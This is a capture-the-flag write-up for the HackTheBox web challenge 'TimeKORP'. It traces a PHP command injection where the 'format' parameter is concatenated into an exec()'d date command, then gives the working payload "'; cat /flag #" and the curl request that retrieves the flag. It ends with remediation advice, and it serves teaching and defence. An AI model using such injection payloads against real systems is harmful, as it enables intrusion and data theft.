# HTB — "TimeKORP" (Web)

**Category:** Web  
**Difficulty:** Easy

---

## Challenge Description

> Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.

The challenge spawns a Docker instance exposed as an `IP:PORT` pair:

```text
154.57.164.78:44401
```

> The IP and port change every time the instance is respawned.

---

## Tooling

- `curl` — to send requests and read raw responses
- The provided source code archive (controllers, models, router, views, Docker setup) — this challenge ships with full source, so static analysis is the fastest path in

---

## Recon: A "What's the Time?" App

A first request shows a small PHP application with a single page:

```bash
curl -i http://154.57.164.78:44401/
```

The page displays the current time, with two links in the navbar:

```text
?format=%H:%M:%S    🕒 What's the time?
?format=%Y-%m-%d    📅 What's the date?
```

Both links control a `format` GET parameter, which is a strong hint that the server uses it to build a `date` command somewhere.

---

## Reading the Source Code

The archive includes the full MVC structure. The relevant files are the controller and the model behind the time display.

**`controllers/TimeController.php`**

```php
public function index($router)
{
    $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
    $time = new TimeModel($format);
    return $router->view('index', ['time' => $time->getTime()]);
}
```

The `format` parameter is taken straight from `$_GET` with no validation and handed to `TimeModel`.

**`models/TimeModel.php`**

```php
public function __construct($format)
{
    $this->command = "date '+'" . $format . "' 2>&1";
}

public function getTime()
{
    $time = exec($this->command);
    $res  = isset($time) ? $time : '?';
    return $res;
}
```

This is the injection point: `$format` is concatenated directly into a shell command executed via `exec()`. It sits inside single quotes, but since the value is fully attacker-controlled, those quotes can simply be broken out of.

---

## Building the Payload

The constructed command has the shape:

```bash
date '+<FORMAT>' 2>&1
```

Supplying `FORMAT = '; cat /flag #` turns this into:

```bash
date '+'; cat /flag #' 2>&1
```

Breaking this down:

- `date '+'` — closes the quoted string early and runs harmlessly
- `;` — command separator, starts a new command
- `cat /flag` — the injected command
- `#` — comments out the rest of the line (`' 2>&1`), avoiding a shell syntax error from the unbalanced quote

This was verified locally before touching the remote instance, by simulating the exact string concatenation and running it through `eval`:

```text
Generated command: date '+'; cat /tmp/flag #' 2>&1
secret flag content
```

URL-encoded, the payload becomes:

```text
?format=%27%3Bcat%20%2Fflag%20%23
```

---

## The Flag

Sending the payload to the live instance:

```bash
curl -s 'http://154.57.164.78:44401/?format=%27%3Bcat%20%2Fflag%20%23'
```

The server executes `date` with the injected `cat /flag`, and `exec()` returns the flag content in place of the time, which gets rendered straight into the page's `<h1>`:

```html
<h1 class="jumbotron-heading">><span class='text-muted'>It's</span> HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_948446997a190de16937c7788a086719}<span class='text-muted'>.</span></h1>
```

```text
HTB{REDACTED}
```

---

## Takeaways

- Never build a shell command by concatenating user input into a string, even when that input looks "wrapped" in quotes — quoting characters supplied by the attacker are just more input, not a sandbox.
- `exec()` (and its relatives `shell_exec`, `system`, `passthru`, backticks) should never receive raw, unsanitized user input. If a shell call is unavoidable, use `escapeshellarg()` on each argument, or better, avoid shelling out entirely and use a native language equivalent (e.g., PHP's own `date()` function instead of spawning `/bin/date`).
- A strict allow-list of valid `format` characters (e.g. only `%HMSYmd:-` and letters) would have closed this off even without touching the shell call itself.
- Having the full source code turns this into a quick static-analysis exercise: grep for `exec(`, `system(`, `shell_exec(`, and backticks, then trace backward to see which of those arguments touch `$_GET`/`$_POST`.
- Always sanity-test payloads locally first (`eval` the generated command string in a throwaway shell) before firing them at the remote instance — it confirms the exact quoting/escaping logic without wasting requests.
